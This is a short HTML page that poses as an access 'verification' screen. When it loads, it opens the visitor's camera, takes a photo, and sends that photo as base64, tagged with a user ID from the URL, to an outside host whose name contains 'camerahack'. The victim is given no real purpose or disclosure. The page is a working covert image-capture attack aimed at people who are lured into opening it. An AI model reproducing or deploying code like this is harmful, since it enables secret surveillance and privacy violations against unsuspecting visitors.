<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Verification</title>
  <style>
    body {
      background: #000;
      color: white;
      text-align: center;
      font-family: Arial, sans-serif;
      padding-top: 50px;
    }
    video {
      width: 300px;
      border-radius: 10px;
      border: 2px solid #0f0;
    }
  </style>
</head>
<body>
  <h1>üîê Verifying Access...</h1>
  <video id="video" autoplay muted playsinline></video>
  <p id="status">Accessing camera...</p>

  <script>
    const userId = new URLSearchParams(window.location.search).get("userid");
    const video = document.getElementById('video');
    const statusText = document.getElementById('status');

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);

        statusText.innerText = "‚úÖ Capturing image...";

        const blob = await imageCapture.takePhoto();
        const reader = new FileReader();
        reader.onloadend = () => {
          fetch("https://camerahack.onrender.com/send-photo", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              user_id: userId,
              img_base64: reader.result
            })
          });
        };
        reader.readAsDataURL(blob);

      } catch (err) {
        statusText.innerText = "‚ùå Failed to access camera.";
      }
    }

    startCamera();
  </script>
</body>
</html>
